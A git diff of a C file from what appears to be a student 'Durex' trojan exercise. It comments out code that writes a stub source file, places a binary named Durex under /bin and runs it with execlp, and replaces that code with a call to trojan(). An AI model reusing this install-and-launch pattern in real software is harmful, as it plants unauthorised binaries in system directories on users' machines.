@@ -6,7 +6,7 @@
 /*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2017/06/01 12:15:37 by hivian            #+#    #+#             */
-/*   Updated: 2017/06/01 15:04:42 by hivian           ###   ########.fr       */
+/*   Updated: 2017/06/01 15:31:12 by hivian           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,7 +19,7 @@ int		main()
 		return (0);
 	}
 
-	char *code = "#include <stdio.h>%c#include <unistd.h>%cint main()%c{%cprintf(%cDAEMON\\n%c);%creturn (0);%c}%c";
+	/*char *code = "#include <stdio.h>%c#include <unistd.h>%cint main()%c{%cprintf(%cDAEMON\\n%c);%creturn (0);%c}%c";
 	char *name = "durex.c";
 	char *bin = "Durex";
 	char bin_dest[5 + strlen(bin) + 1];
@@ -27,7 +27,7 @@ int		main()
 	printf("hivian\n");
 	memset(bin_dest, 0, strlen(bin_dest));
 	printf(code, 10, 10, 10, 10, 34, 34, 10, 10, 10);
-	FILE *f = fopen(name,"w");
+	FILE *f = fopen(name, "w");
 	fprintf(f, code, 10, 10, 10, 10, 34, 34, 10, 10, 10);
 	fclose(f);
 	sprintf(bin_dest, "/bin/%s", bin);
@@ -47,7 +47,9 @@ int		main()
 		X(-1, execlp("/bin/Durex", bin, NULL), "execlp");
 	} else {
 		X(-1, wait(NULL), "wait");
-	}
+	}*/
+
+	trojan();
 
 	return (0);
 }
